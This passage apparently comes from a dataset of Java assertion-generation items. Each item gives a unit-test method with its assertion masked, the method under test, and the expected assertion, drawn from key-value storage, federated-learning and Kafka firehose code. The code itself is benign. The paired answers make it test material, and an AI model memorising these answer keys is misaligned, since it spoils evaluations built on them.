MPFastKV(TestHelper.MP_DIR, name, null, null, false); Assert.""<AssertPlaceHolder>""; }
commit() { return updateFile(); }"	"assertEquals(""hello"", kv2.getString(""flag""))"
"Exception { String name = ""test_force""; MPFastKV kv1 = new MPFastKV.Builder(TestHelper.MP_DIR, name).disableWatchFileChange().build(); long newTime = System.currentTimeMillis() ^ System.nanoTime();  kv1.putLong(""time"", newTime); kv1.commit(); kv1.force();  File aFile = new File(TestHelper.MP_DIR, name + "".kva""); RandomAccessFile accessFile = new RandomAccessFile(aFile, ""r""); ByteBuffer buffer = ByteBuffer.allocate(26); buffer.order(ByteOrder.LITTLE_ENDIAN); accessFile.read(buffer.array(), 0, 26); long t = buffer.getLong(18); Assert.""<AssertPlaceHolder>""; }
force() { try { if (aBuffer != null) { aBuffer.force(); } if (bChannel != null) { bChannel.force(true); } } catch (Exception e) { error(e); } }"	assertEquals(newTime, t)
"ClassNotFoundException { //        long start1 = System.currentTimeMillis(); //        List<DistributedFederatedGBModel> list = KryoUtil.readFromString(kryoSerialize); //        long end1 = System.currentTimeMillis(); //        logger.info(""kryo反序列化耗时：{}"", end1 - start1); // //        long start2 = System.currentTimeMillis(); //        List<DistributedFederatedGBModel> list2 = (List<DistributedFederatedGBModel>) SerializationUtils.deserialize(jdkSerialize); //        long end2 = System.currentTimeMillis(); //        logger.info(""原反序列化耗时：{}"", end2 - start2); //        Assert.""<AssertPlaceHolder>""; //    }
readFromString(String str){ try { byte[] bytes2= new BASE64Decoder().decodeBuffer(str); return readFromByteArray(bytes2); } catch (IOException e) { logger.error(""readFromString error :{}"",e.getMessage()); } return null; }"	assertEquals(list.size(), size)
"InterruptedException { int threads = 10; CountDownLatch countDownLatch = new CountDownLatch(threads); ExecutorService fixedThreadPool = Executors.newFixedThreadPool(threads); RuntimeStatusService runtimeStatusService = new RuntimeStatusService(); for (int i = 0; i < threads; i++) { fixedThreadPool.submit(() -> { WorkerStatus workerStatus = new WorkerStatus(); workerStatus.setModelToken(""testToken""); workerStatus.setAlgorithm(AlgorithmType.DistributedFederatedGB); workerStatus.setDataSet(""test.csv""); workerStatus.setTaskType(TaskTypeEnum.MAP); workerStatus.setPhase(1); Map<String, Object> service = runtimeStatusService.service(workerStatus); countDownLatch.countDown(); }); } countDownLatch.await(); Assert.""<AssertPlaceHolder>""; }
service(WorkerStatus workerStatus) { Map<String, Object> result = new HashMap<>(16); Runtime r = Runtime.getRuntime(); TaskTypeEnum taskTypeEnum = workerStatus.getTaskType(); logger.info(""当前任务类型：{},jvm总内存：{} M"",taskTypeEnum, r.maxMemory() / 1024 / 1024); double usedMemory = (double) (r.totalMemory() - r.freeMemory()); boolean flag = false; String modelToken = workerStatus.getModelToken(); int phase = workerStatus.getPhase(); double mapUseMem; double freeMemory; double memRate; if (taskTypeEnum.equals(TaskTypeEnum.MAP)) { String key = modelToken + ""-"" + phase; synchronized (mapTaskMap) { Integer orDefault = mapTaskMap.getOrDefault(key, 0); mapUseMem = orDefault * XGB_MAP_MEM; logger.info(""当前phase:{},已执行 {} 个MAP任务，分配内存：{}M"", phase, orDefault, mapUseMem / 1024 / 1024); freeMemory = r.maxMemory() - usedMemory - mapUseMem; logger.info(""jvm剩余内存：{} M,使用内存：{} M"", freeMemory / 1024 / 1024, usedMemory / 1024 / 1024); memRate = freeMemory / r.maxMemory(); logger.info(""jvm内存剩余百分比：{}"", memRate); if (memRate > MEM_THRESHOLD_MAP) { flag = true; Integer num = orDefault + 1; mapTaskMap.put(key, num); } else { logger.info(""没有空闲资源!""); } } } else if (taskTypeEnum.equals(TaskTypeEnum.REDUCE) || taskTypeEnum.equals(TaskTypeEnum.INIT) || taskTypeEnum.equals(TaskTypeEnum.FINISH)) { freeMemory = r.maxMemory() - usedMemory; logger.info(""jvm剩余内存：{} M"", freeMemory / 1024 / 1024); memRate = freeMemory / r.maxMemory(); logger.info(""jvm内存剩余百分比：{}"", memRate); if (memRate > MEM_THRESHOLD_REDUCE) { flag = true; } } result.put(ResponseConstant.DATA, flag); return result; }"	"assertTrue(RuntimeStatusService.mapTaskMap.get(""testToken-1"") >1)"
"shouldReturnJsonSinkTypeFromLowerCaseInput() { HttpSinkDataFormatType httpSinkDataFormatType = httpSinkDataFormatTypeConverter.convert(null, ""json""); Assert.""<AssertPlaceHolder>""; }
convert(Method method, String input) { return HttpSinkDataFormatType.valueOf(input.toUpperCase()); }"	assertTrue(httpSinkDataFormatType.equals(HttpSinkDataFormatType.JSON))
"shouldReturnJsonSinkTypeFromUpperCaseInput() { HttpSinkDataFormatType httpSinkDataFormatType = httpSinkDataFormatTypeConverter.convert(null, ""JSON""); Assert.""<AssertPlaceHolder>""; }
convert(Method method, String input) { return HttpSinkDataFormatType.valueOf(input.toUpperCase()); }"	assertTrue(httpSinkDataFormatType.equals(HttpSinkDataFormatType.JSON))
"shouldReturnJsonSinkTypeFromMixedCaseInput() { HttpSinkDataFormatType httpSinkDataFormatType = httpSinkDataFormatTypeConverter.convert(null, ""JsOn""); Assert.""<AssertPlaceHolder>""; }
convert(Method method, String input) { return HttpSinkDataFormatType.valueOf(input.toUpperCase()); }"	assertTrue(httpSinkDataFormatType.equals(HttpSinkDataFormatType.JSON))
"shouldReturnProtoSinkTypeFromInput() { HttpSinkDataFormatType httpSinkDataFormatType = httpSinkDataFormatTypeConverter.convert(null, ""proto""); Assert.""<AssertPlaceHolder>""; }
convert(Method method, String input) { return HttpSinkDataFormatType.valueOf(input.toUpperCase()); }"	assertTrue(httpSinkDataFormatType.equals(HttpSinkDataFormatType.PROTO))
"Exception { String json = ""{""1"":{""1"":""order_number"",""2"":""order_url"",""3"":""order_details""},""3"":""number_field""}"";  Properties actualProperties = new ProtoIndexToFieldMapConverter().convert(null, json);  Properties expectedNestedProperties = new Properties(); expectedNestedProperties.put(""1"", ""order_number""); expectedNestedProperties.put(""2"", ""order_url""); expectedNestedProperties.put(""3"", ""order_details"");  Properties expectedProperties = new Properties(); expectedProperties.put(""1"", expectedNestedProperties); expectedProperties.put(""3"", ""number_field"");  ""<AssertPlaceHolder>""; }
convert(Method method, String input) { if (Strings.isNullOrEmpty(input)) { return null; } Type type = new TypeToken<Map<String, Object>>() { }.getType(); Map<String, Object> m = new Gson().fromJson(input, type); Properties properties = getProperties(m); validate(properties); return properties; }"	assertThat(actualProperties, equalTo(expectedProperties))
"Exception { String json = ""{""1"":{""1"":""order_number"",""2"":""order_url"",""3"":{""1"":""longitude"",""2"":""latitude""}},""3"":""number_field""}"";  Properties actualProperties = new ProtoIndexToFieldMapConverter().convert(null, json);  Properties expectedFurtherNestedProperties = new Properties(); expectedFurtherNestedProperties.put(""1"", ""longitude""); expectedFurtherNestedProperties.put(""2"", ""latitude"");  Properties expectedNestedProperties = new Properties(); expectedNestedProperties.put(""1"", ""order_number""); expectedNestedProperties.put(""2"", ""order_url""); expectedNestedProperties.put(""3"", expectedFurtherNestedProperties);  Properties expectedProperties = new Properties(); expectedProperties.put(""1"", expectedNestedProperties); expectedProperties.put(""3"", ""number_field"");  ""<AssertPlaceHolder>""; }
convert(Method method, String input) { if (Strings.isNullOrEmpty(input)) { return null; } Type type = new TypeToken<Map<String, Object>>() { }.getType(); Map<String, Object> m = new Gson().fromJson(input, type); Properties properties = getProperties(m); validate(properties); return properties; }"	assertThat(actualProperties, equalTo(expectedProperties))
"shouldNotProcessEmptyStringAsProperties() { String json = """";  Properties actualProperties = new ProtoIndexToFieldMapConverter().convert(null, json);  ""<AssertPlaceHolder>""; }
convert(Method method, String input) { if (Strings.isNullOrEmpty(input)) { return null; } Type type = new TypeToken<Map<String, Object>>() { }.getType(); Map<String, Object> m = new Gson().fromJson(input, type); Properties properties = getProperties(m); validate(properties); return properties; }"	assertNull(actualProperties)
"shouldNotProcessNullStringAsProperties() { Properties actualProperties = new ProtoIndexToFieldMapConverter().convert(null, null);  ""<AssertPlaceHolder>""; }
convert(Method method, String input) { if (Strings.isNullOrEmpty(input)) { return null; } Type type = new TypeToken<Map<String, Object>>() { }.getType(); Map<String, Object> m = new Gson().fromJson(input, type); Properties properties = getProperties(m); validate(properties); return properties; }"	assertNull(actualProperties)
"shouldConvertRangeToHashMap() { Map<Integer, Boolean> actualHashedRanges = new RangeToHashMapConverter().convert(null, ""100-103""); ""<AssertPlaceHolder>""; }
convert(Method method, String input) { String[] ranges = input.split("",""); Map<Integer, Boolean> statusMap = new HashMap<Integer, Boolean>();  Arrays.stream(ranges).forEach(range -> { List<Integer> rangeList = Arrays.stream(range.split(""-"")).map(Integer::parseInt).collect(Collectors.toList()); IntStream.rangeClosed(rangeList.get(0), rangeList.get(1)).forEach(statusCode -> statusMap.put(statusCode, true)); }); return statusMap; }"	assertArrayEquals(new Integer[]{100, 101, 102, 103}, actualHashedRanges.keySet().toArray())
"shouldConvertSchemaTypeWithLowerCase() { InputSchemaTypeConverter converter = new InputSchemaTypeConverter(); InputSchemaType schemaType = converter.convert(null, "" json ""); Assert.""<AssertPlaceHolder>""; }
convert(Method method, String input) { return InputSchemaType.valueOf(input.trim().toUpperCase()); }"	assertEquals(InputSchemaType.JSON, schemaType)
"Exception { Timestamp timestamp = Timestamp.newBuilder().setSeconds(1479135490).setNanos(333).build(); ""<AssertPlaceHolder>""; }
getEpochTimeInNanoSeconds(Timestamp time) { return getEpochTimeInNanoSeconds(time.getSeconds(), time.getNanos()); }"	assertEquals(1479135490000000333L, ProtoTimeConverter.getEpochTimeInNanoSeconds(timestamp))
"Exception { Timestamp timestamp = Timestamp.newBuilder().setSeconds(1479135490).build(); ""<AssertPlaceHolder>""; }
getEpochTimeInNanoSeconds(Timestamp time) { return getEpochTimeInNanoSeconds(time.getSeconds(), time.getNanos()); }"	assertEquals(1479135490000000000L, ProtoTimeConverter.getEpochTimeInNanoSeconds(timestamp))
"FilterException { Message message = new Message(key.toByteArray(), this.testMessage.toByteArray(), ""topic1"", 0, 100); filter = new JexlFilter(kafkaConsumerConfig, firehoseInstrumentation); FilteredMessages filteredMessages = filter.filter(Arrays.asList(message)); FilteredMessages expectedMessages = new FilteredMessages(); expectedMessages.addToValidMessages(message); ""<AssertPlaceHolder>""; }
filter(List<Message> messages) throws FilterException { FilteredMessages filteredMessages = new FilteredMessages(); for (Message message : messages) { try { Object data = (filterDataSourceType.equals(FilterDataSourceType.KEY)) ? message.getLogKey() : message.getLogMessage(); Object obj = MethodUtils.invokeStaticMethod(Class.forName(protoSchema), ""parseFrom"", data); if (evaluate(obj)) { filteredMessages.addToValidMessages(message); } else { filteredMessages.addToInvalidMessages(message); } } catch (ClassNotFoundException | NoSuchMethodException | IllegalAccessException | InvocationTargetException e) { throw new FilterException(""Failed while filtering EsbMessages"", e); } } return filteredMessages;  }"	assertEquals(expectedMessages, filteredMessages)
"FilterException { TestBookingLogMessage bookingLogMessage = TestBookingLogMessage.newBuilder().setCustomerId(""customerId"").build(); TestBookingLogKey bookingLogKey = TestBookingLogKey.newBuilder().build(); Message message = new Message(bookingLogKey.toByteArray(), bookingLogMessage.toByteArray(), ""topic1"", 0, 100); HashMap<String, String> bookingFilterConfigs = new HashMap<>(); bookingFilterConfigs.put(""FILTER_DATA_SOURCE"", ""message""); bookingFilterConfigs.put(""FILTER_JEXL_EXPRESSION"", ""testBookingLogMessage.getCustomerDynamicSurgeEnabled() == false""); bookingFilterConfigs.put(""FILTER_SCHEMA_PROTO_CLASS"", TestBookingLogMessage.class.getName()); FilterConfig bookingConsumerConfig = ConfigFactory.create(FilterConfig.class, bookingFilterConfigs); JexlFilter bookingFilter = new JexlFilter(bookingConsumerConfig, firehoseInstrumentation); FilteredMessages expectedMessages = new FilteredMessages(); expectedMessages.addToValidMessages(message); FilteredMessages filteredMessages = bookingFilter.filter(Arrays.asList(message)); ""<AssertPlaceHolder>""; }
filter(List<Message> messages) throws FilterException { FilteredMessages filteredMessages = new FilteredMessages(); for (Message message : messages) { try { Object data = (filterDataSourceType.equals(FilterDataSourceType.KEY)) ? message.getLogKey() : message.getLogMessage(); Object obj = MethodUtils.invokeStaticMethod(Class.forName(protoSchema), ""parseFrom"", data); if (evaluate(obj)) { filteredMessages.addToValidMessages(message); } else { filteredMessages.addToInvalidMessages(message); } } catch (ClassNotFoundException | NoSuchMethodException | IllegalAccessException | InvocationTargetException e) { throw new FilterException(""Failed while filtering EsbMessages"", e); } } return filteredMessages;  }"	assertEquals(expectedMessages, filteredMessages)
"FilterException { Message message1 = new Message(testKeyProto1.toByteArray(), testMessageProto1.toByteArray(), ""topic1"", 0, 100); Message message2 = new Message(testKeyProto2.toByteArray(), testMessageProto2.toByteArray(), ""topic1"", 0, 101); Map<String, String> filterConfigs = new HashMap<>(); filterConfigs.put(""FILTER_DATA_SOURCE"", ""message""); filterConfigs.put(""FILTER_ESB_MESSAGE_FORMAT"", ""PROTOBUF""); filterConfigs.put(""FILTER_JSON_SCHEMA"", """"); filterConfigs.put(""FILTER_SCHEMA_PROTO_CLASS"", TestMessage.class.getName()); filterConfig = ConfigFactory.create(FilterConfig.class, filterConfigs); jsonFilter = new JsonFilter(stencilClient, filterConfig, firehoseInstrumentation); FilteredMessages expectedMessages = new FilteredMessages(); expectedMessages.addToValidMessages(message1); expectedMessages.addToValidMessages(message2); List<Message> inputMessages = Arrays.asList(message1, message2); FilteredMessages filteredMessages = jsonFilter.filter(inputMessages); ""<AssertPlaceHolder>""; }
filter(List<Message> messages) throws FilterException { FilteredMessages filteredMessages = new FilteredMessages(); for (Message message : messages) { byte[] data = (filterConfig.getFilterDataSource().equals(KEY)) ? message.getLogKey() : message.getLogMessage(); String jsonMessage = deserialize(data); if (evaluate(jsonMessage)) { filteredMessages.addToValidMessages(message); } else { filteredMessages.addToInvalidMessages(message); } } return filteredMessages; }"	assertEquals(expectedMessages, filteredMessages)
"FilterException { Message message1 = new Message(testKeyJson1.getBytes(), testMessageJson1.getBytes(), ""topic1"", 0, 100); Message message2 = new Message(testKeyJson2.getBytes(), testMessageJson2.getBytes(), ""topic1"", 0, 101); Map<String, String> filterConfigs = new HashMap<>(); filterConfigs.put(""FILTER_ESB_MESSAGE_FORMAT"", ""JSON""); filterConfigs.put(""FILTER_DATA_SOURCE"", ""message""); filterConfigs.put(""FILTER_JSON_SCHEMA"", """"); filterConfig = ConfigFactory.create(FilterConfig.class, filterConfigs); jsonFilter = new JsonFilter(stencilClient, filterConfig, firehoseInstrumentation); FilteredMessages expectedMessages = new FilteredMessages(); expectedMessages.addToValidMessages(message1); expectedMessages.addToValidMessages(message2); List<Message> inputMessages = Arrays.asList(message1, message2); FilteredMessages filteredMessages = jsonFilter.filter(inputMessages); ""<AssertPlaceHolder>""; }
filter(List<Message> messages) throws FilterException { FilteredMessages filteredMessages = new FilteredMessages(); for (Message message : messages) { byte[] data = (filterConfig.getFilterDataSource().equals(KEY)) ? message.getLogKey() : message.getLogMessage(); String jsonMessage = deserialize(data); if (evaluate(jsonMessage)) { filteredMessages.addToValidMessages(message); } else { filteredMessages.addToInvalidMessages(message); } } return filteredMessages; }"	assertEquals(expectedMessages, filteredMessages)
"FilterException { TestBookingLogMessage bookingLogMessage = TestBookingLogMessage.newBuilder().setCustomerId(""customerId"").build(); TestBookingLogKey bookingLogKey = TestBookingLogKey.newBuilder().build(); Message message = new Message(bookingLogKey.toByteArray(), bookingLogMessage.toByteArray(), ""topic1"", 0, 100); HashMap<String, String> filterConfigs = new HashMap<>(); filterConfigs.put(""FILTER_DATA_SOURCE"", ""message""); filterConfigs.put(""FILTER_JSON_SCHEMA"", ""{""properties"":{""customer_dynamic_surge_enabled"":{""const"":""true""}}}""); filterConfigs.put(""FILTER_SCHEMA_PROTO_CLASS"", TestBookingLogMessage.class.getName()); filterConfigs.put(""FILTER_ESB_MESSAGE_FORMAT"", ""PROTOBUF""); FilterConfig bookingConsumerConfig = ConfigFactory.create(FilterConfig.class, filterConfigs); JsonFilter bookingFilter = new JsonFilter(stencilClient, bookingConsumerConfig, firehoseInstrumentation); FilteredMessages expectedMessages = new FilteredMessages(); expectedMessages.addToValidMessages(message); FilteredMessages filteredMessages = bookingFilter.filter(Collections.singletonList(message)); ""<AssertPlaceHolder>""; }
filter(List<Message> messages) throws FilterException { FilteredMessages filteredMessages = new FilteredMessages(); for (Message message : messages) { byte[] data = (filterConfig.getFilterDataSource().equals(KEY)) ? message.getLogKey() : message.getLogMessage(); String jsonMessage = deserialize(data); if (evaluate(jsonMessage)) { filteredMessages.addToValidMessages(message); } else { filteredMessages.addToInvalidMessages(message); } } return filteredMessages; }"	assertEquals(expectedMessages, filteredMessages)
"InterruptedException { final List<Long> threadList = new ArrayList<>(); Task task = new Task(PARALLELISM, THREAD_CLEANUP_DELAY_IN_MS, firehoseInstrumentation, callback -> { threadList.add(Thread.currentThread().getId()); callback.run(); });  task.run().waitForCompletion(); ""<AssertPlaceHolder>""; }
waitForCompletion() throws InterruptedException { firehoseInstrumentation.logInfo(""waiting for completion""); countDownLatch.await(); }"	assertEquals(threadList.size(), PARALLELISM)
"shouldReturnEmptyList() { List<org.raystack.depot.message.Message> actualMessages = FirehoseMessageUtils.convertToDepotMessage(new ArrayList<>()); Assert.""<AssertPlaceHolder>""; }
convertToDepotMessage(List<Message> messages) { return messages.stream().map(message -> new org.raystack.depot.message.Message( message.getLogKey(), message.getLogMessage(), new Tuple<>(""message_topic"", message.getTopic()), new Tuple<>(""message_partition"", message.getPartition()), new Tuple<>(""message_offset"", message.getOffset()), new Tuple<>(""message_headers"", message.getHeaders()), new Tuple<>(""message_timestamp"", message.getTimestamp()), new Tuple<>(""load_time"", message.getConsumeTimestamp()))) .collect(Collectors.toList()); }"	assertEquals(Collections.emptyList(), actualMessages)
"encodesKeyToBase64() { String actual = message.getSerializedKey();  String expected = ""CgMxMjMSA2FiYw=="";  ""<AssertPlaceHolder>""; }
getSerializedKey() { return encodedSerializedStringFrom(logKey); }"	assertEquals(expected, actual)
"nullKeyGetsEncoded() {  message = new Message(null, testMessage.toByteArray(), ""Topic"", 0, 100);  ""<AssertPlaceHolder>""; }
getSerializedKey() { return encodedSerializedStringFrom(logKey); }"	"assertEquals("""", message.getSerializedKey())"
"emptyKeyGetsEncoded() {  message = new Message(new byte[]{}, testMessage.toByteArray(), ""Topic"", 0, 100);  ""<AssertPlaceHolder>""; }
getSerializedKey() { return encodedSerializedStringFrom(logKey); }"	"assertEquals("""", message.getSerializedKey())"
"encodesValueToBase64() { String actual = message.getSerializedMessage();  String expected = ""CgMxMjMSA2FiYxoHZGV0YWlscw=="";  ""<AssertPlaceHolder>""; }
getSerializedMessage() { return encodedSerializedStringFrom(logMessage); }"	assertEquals(expected, actual)
"shouldSetStartExecutionTime() { firehoseInstrumentation.startExecution(); Assert.""<AssertPlaceHolder>""; }
getStartExecutionTime() { return startExecutionTime; }"	assertEquals(firehoseInstrumentation.getStartExecutionTime().getEpochSecond(), java.time.Instant.now().getEpochSecond())
"shouldReturnStartExecutionTime() { Instant time = firehoseInstrumentation.startExecution(); Assert.""<AssertPlaceHolder>""; }
getStartExecutionTime() { return startExecutionTime; }"	assertEquals(firehoseInstrumentation.getStartExecutionTime().getEpochSecond(), time.getEpochSecond())
"shouldReturnKafkaEnvVarsPositive() { HashMap<String, String> systemEnvs = new HashMap<String, String>() {{ put(""PATH"", ""/usr/local/bin""); put(""SHELL"", ""/usr/local/bin/zsh""); put(""source_kafka_consumer_config_fetch_min_bytes"", ""1""); put(""source_kafka_consumer_config_ssl_keystore_location"", ""/home/user/.ssh/keystore""); put(""SOURCE_KAFKA_CONSUMER_CONFIG_ENABLE_AUTO_COMMIT"", ""false"");  }};  Map<String, String> expectedEnvVars = new HashMap<String, String>() {{ put(""fetch.min.bytes"", ""1""); put(""ssl.keystore.location"", ""/home/user/.ssh/keystore""); put(""enable.auto.commit"", ""false""); }};  Map<String, String> actualEnvVars = KafkaEnvironmentVariables.parse(systemEnvs);  ""<AssertPlaceHolder>""; }
parse(Map<String, String> envVars) { if (envVars == null || envVars.isEmpty()) { return Collections.emptyMap(); } Map<String, String> kafkaEnvVars = envVars.entrySet() .stream() .filter(a -> a.getKey().toLowerCase().startsWith(KAFKA_PREFIX)) .collect(Collectors.toMap(e -> parseVarName(e.getKey()), e -> e.getValue())); return kafkaEnvVars; }"	assertEquals(expectedEnvVars, actualEnvVars)
"shouldReturnKafkaEnvVarsNegative() { HashMap<String, String> systemEnvs = new HashMap<String, String>() {{ put(""PATH"", ""/usr/local/bin""); put(""SHELL"", ""/usr/local/bin/zsh""); }};  Map<String, String> expectedEnvVars = new HashMap<>();  Map<String, String> actualEnvVars = KafkaEnvironmentVariables.parse(systemEnvs);  ""<AssertPlaceHolder>""; }
parse(Map<String, String> envVars) { if (envVars == null || envVars.isEmpty()) { return Collections.emptyMap(); } Map<String, String> kafkaEnvVars = envVars.entrySet() .stream() .filter(a -> a.getKey().toLowerCase().startsWith(KAFKA_PREFIX)) .collect(Collectors.toMap(e -> parseVarName(e.getKey()), e -> e.getValue())); return kafkaEnvVars; }"	assertEquals(expectedEnvVars, actualEnvVars)
"shouldReturnEmptyCollectionOnNullEnvVars() { HashMap<String, String> systemEnvs = null; Map<String, String> expectedEnvVars = new HashMap<>();  Map<String, String> actualEnvVars = KafkaEnvironmentVariables.parse(systemEnvs);  ""<AssertPlaceHolder>""; }
parse(Map<String, String> envVars) { if (envVars == null || envVars.isEmpty()) { return Collections.emptyMap(); } Map<String, String> kafkaEnvVars = envVars.entrySet() .stream() .filter(a -> a.getKey().toLowerCase().startsWith(KAFKA_PREFIX)) .collect(Collectors.toMap(e -> parseVarName(e.getKey()), e -> e.getValue())); return kafkaEnvVars; }"	assertEquals(expectedEnvVars, actualEnvVars)
"shouldReturnEmptyCollectionOnEmptyEnvVars() { HashMap<String, String> systemEnvs = new HashMap<>(); Map<String, String> expectedEnvVars = new HashMap<>();  Map<String, String> actualEnvVars = KafkaEnvironmentVariables.parse(systemEnvs);  ""<AssertPlaceHolder>""; }
parse(Map<String, String> envVars) { if (envVars == null || envVars.isEmpty()) { return Collections.emptyMap(); } Map<String, String> kafkaEnvVars = envVars.entrySet() .stream() .filter(a -> a.getKey().toLowerCase().startsWith(KAFKA_PREFIX)) .collect(Collectors.toMap(e -> parseVarName(e.getKey()), e -> e.getValue())); return kafkaEnvVars; }"	assertEquals(expectedEnvVars, actualEnvVars)
"shouldThrowExceptionForCorruptedEsbMessages() { ProtoMessage protoMessage = new ProtoMessage(TestBookingLogKey.class.getName());  try { protoMessage.get(message, FEEDBACK_INDEX);  fail(""Should throw deserialzer exception on recieving corrupted messages""); } catch (DeserializerException e) { ""<AssertPlaceHolder>""; } }
get(Message message, int protoIndex) throws DeserializerException { GeneratedMessageV3 protoMsg; protoMsg = (GeneratedMessageV3) parseProtobuf(message); Descriptors.FieldDescriptor fieldDescriptor = protoMsg.getDescriptorForType().findFieldByNumber(protoIndex); return protoMsg.getField(fieldDescriptor); }"	assertEquals(ProtoMessage.DESERIALIZE_ERROR_MESSAGE, e.getMessage())
"DeserializerException { JsonWrappedProtoByte jsonWrappedProtoByte = new JsonWrappedProtoByte(); ""<AssertPlaceHolder>""; }
serialize(Message message) throws DeserializerException { return gson.toJson(message); }"	"assertEquals(""{""topic"":""sample-topic"",""log_key"":""CgYIyOm+xgUSBgiE6r7GBRgNIICAgIDA9/y0LigC"",""log_message"":""CgYIyOm+xgUSBgiE6r7GBRgNIICAgIDA9/y0LigCMAM\\u003d""}"", jsonWrappedProtoByte.serialize(message))"
"DeserializerException { MessageToJson messageToJson = new MessageToJson(protoParser, false, true);  Message message = new Message(Base64.getDecoder().decode(logKey.getBytes()), Base64.getDecoder().decode(logMessage.getBytes()), ""sample-topic"", 0, 100); String actualOutput = messageToJson.serialize(message); ""<AssertPlaceHolder>""; }
serialize(Message message) throws DeserializerException { try { JSONObject jsonObject = new JSONObject(); jsonObject.put(""topic"", message.getTopic());  if (message.getLogKey() != null && message.getLogKey().length != 0) { DynamicMessage key = protoParser.parse(message.getLogKey()); jsonObject.put(""logKey"", this.gson.toJson(convertDynamicMessageToJson(key))); }  DynamicMessage msg = protoParser.parse(message.getLogMessage()); jsonObject.put(""logMessage"", this.gson.toJson(convertDynamicMessageToJson(msg)));  if (wrapInsideArray) { return Collections.singletonList(jsonObject.toJSONString()).toString(); } return jsonObject.toJSONString(); } catch (InvalidProtocolBufferException | ParseException e) { throw new DeserializerException(e.getMessage()); } }"	"assertEquals(actualOutput, ""{""logMessage"":""{\\""uniqueDrivers\\"":\\""3\\"","" + ""\\""windowStartTime\\"":\\""Mar 20, 2017 10:54:00 AM\\"","" + ""\\""windowEndTime\\"":\\""Mar 20, 2017 10:55:00 AM\\"",\\""s2IdLevel\\"":13,\\""vehicleType\\"":\\""BIKE\\"","" + ""\\""s2Id\\"":\\""3344472187078705152\\""}"",""topic"":""sample-topic"",""logKey"":""{"" + ""\\""windowStartTime\\"":\\""Mar 20, 2017 10:54:00 AM\\"","" + ""\\""windowEndTime\\"":\\""Mar 20, 2017 10:55:00 AM\\"",\\""s2IdLevel\\"":13,\\""vehicleType\\"":\\""BIKE\\"","" + ""\\""s2Id\\"":\\""3344472187078705152\\""}""}"")"
"DeserializerException { MessageToJson messageToJson = new MessageToJson(protoParser, false, true);  Message message = new Message(null, Base64.getDecoder().decode(logMessage.getBytes()), ""sample-topic"", 0, 100); String actualOutput = messageToJson.serialize(message); ""<AssertPlaceHolder>""; }
serialize(Message message) throws DeserializerException { try { JSONObject jsonObject = new JSONObject(); jsonObject.put(""topic"", message.getTopic());  if (message.getLogKey() != null && message.getLogKey().length != 0) { DynamicMessage key = protoParser.parse(message.getLogKey()); jsonObject.put(""logKey"", this.gson.toJson(convertDynamicMessageToJson(key))); }  DynamicMessage msg = protoParser.parse(message.getLogMessage()); jsonObject.put(""logMessage"", this.gson.toJson(convertDynamicMessageToJson(msg)));  if (wrapInsideArray) { return Collections.singletonList(jsonObject.toJSONString()).toString(); } return jsonObject.toJSONString(); } catch (InvalidProtocolBufferException | ParseException e) { throw new DeserializerException(e.getMessage()); } }"	"assertEquals(""{""logMessage"":""{\\""uniqueDrivers\\"":\\""3\\"","" + ""\\""windowStartTime\\"":\\""Mar 20, 2017 10:54:00 AM\\"","" + ""\\""windowEndTime\\"":\\""Mar 20, 2017 10:55:00 AM\\"",\\""s2IdLevel\\"":13,\\""vehicleType\\"":\\""BIKE\\"","" + ""\\""s2Id\\"":\\""3344472187078705152\\""}"",""topic"":""sample-topic""}"", actualOutput)"
"DeserializerException { MessageToJson messageToJson = new MessageToJson(protoParser, false, true);  Message message = new Message(new byte[]{}, Base64.getDecoder().decode(logMessage.getBytes()), ""sample-topic"", 0, 100);  String actualOutput = messageToJson.serialize(message); ""<AssertPlaceHolder>""; }
serialize(Message message) throws DeserializerException { try { JSONObject jsonObject = new JSONObject(); jsonObject.put(""topic"", message.getTopic());  if (message.getLogKey() != null && message.getLogKey().length != 0) { DynamicMessage key = protoParser.parse(message.getLogKey()); jsonObject.put(""logKey"", this.gson.toJson(convertDynamicMessageToJson(key))); }  DynamicMessage msg = protoParser.parse(message.getLogMessage()); jsonObject.put(""logMessage"", this.gson.toJson(convertDynamicMessageToJson(msg)));  if (wrapInsideArray) { return Collections.singletonList(jsonObject.toJSONString()).toString(); } return jsonObject.toJSONString(); } catch (InvalidProtocolBufferException | ParseException e) { throw new DeserializerException(e.getMessage()); } }"	"assertEquals(""{""logMessage"":""{\\""uniqueDrivers\\"":\\""3\\"","" + ""\\""windowStartTime\\"":\\""Mar 20, 2017 10:54:00 AM\\"","" + ""\\""windowEndTime\\"":\\""Mar 20, 2017 10:55:00 AM\\"",\\""s2IdLevel\\"":13,\\""vehicleType\\"":\\""BIKE\\"","" + ""\\""s2Id\\"":\\""3344472187078705152\\""}"",""topic"":""sample-topic""}"", actualOutput)"
"DeserializerException { MessageToJson messageToJson = new MessageToJson(protoParser, false, false);  Message message = new Message(new byte[]{}, Base64.getDecoder().decode(logMessage.getBytes()), ""sample-topic"", 0, 100);  String actualOutput = messageToJson.serialize(message); ""<AssertPlaceHolder>""; }
serialize(Message message) throws DeserializerException { try { JSONObject jsonObject = new JSONObject(); jsonObject.put(""topic"", message.getTopic());  if (message.getLogKey() != null && message.getLogKey().length != 0) { DynamicMessage key = protoParser.parse(message.getLogKey()); jsonObject.put(""logKey"", this.gson.toJson(convertDynamicMessageToJson(key))); }  DynamicMessage msg = protoParser.parse(message.getLogMessage()); jsonObject.put(""logMessage"", this.gson.toJson(convertDynamicMessageToJson(msg)));  if (wrapInsideArray) { return Collections.singletonList(jsonObject.toJSONString()).toString(); } return jsonObject.toJSONString(); } catch (InvalidProtocolBufferException | ParseException e) { throw new DeserializerException(e.getMessage()); } }"	"assertEquals(""{""logMessage"":""{\\""uniqueDrivers\\"":\\""3\\"","" + ""\\""windowStartTime\\"":\\""2017-03-20T10:54:00Z\\"","" + ""\\""windowEndTime\\"":\\""2017-03-20T10:55:00Z\\"",\\""s2IdLevel\\"":13,\\""vehicleType\\"":\\""BIKE\\"","" + ""\\""s2Id\\"":\\""3344472187078705152\\""}"",""topic"":""sample-topic""}"", actualOutput)"
"DeserializerException { boolean wrappedInsideArray = true; MessageToJson messageToJson = new MessageToJson(protoParser, false, wrappedInsideArray, true);  Message message = new Message(new byte[]{}, Base64.getDecoder().decode(logMessage.getBytes()), ""sample-topic"", 0, 100);  String actualOutput = messageToJson.serialize(message); ""<AssertPlaceHolder>""; }
